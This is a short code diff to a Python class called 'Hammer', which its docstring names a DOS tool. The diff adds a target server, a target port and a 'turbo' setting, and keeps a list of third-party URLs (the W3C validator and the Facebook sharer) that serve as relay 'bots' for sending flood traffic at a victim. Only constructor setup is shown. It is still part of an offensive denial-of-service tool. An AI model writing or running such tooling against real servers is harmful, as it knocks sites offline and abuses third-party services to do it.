@@ -81,7 +81,14 @@ class DefaultHttpParameters:
 
 class Hammer:
     
-    def __init__(self, bots: List[str] = None):
+    """
+    Hammer DOS tool
+    """
+    
+    def __init__(self, target_server: str, target_port: int, turbo: int = 135):
         
-        self.hammer_bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="] + \
-            bots if bots != None else ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
+        self.hammer_bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
+        self.server = target_server
+        self.port = target_port
+        self.turbo = turbo
+        
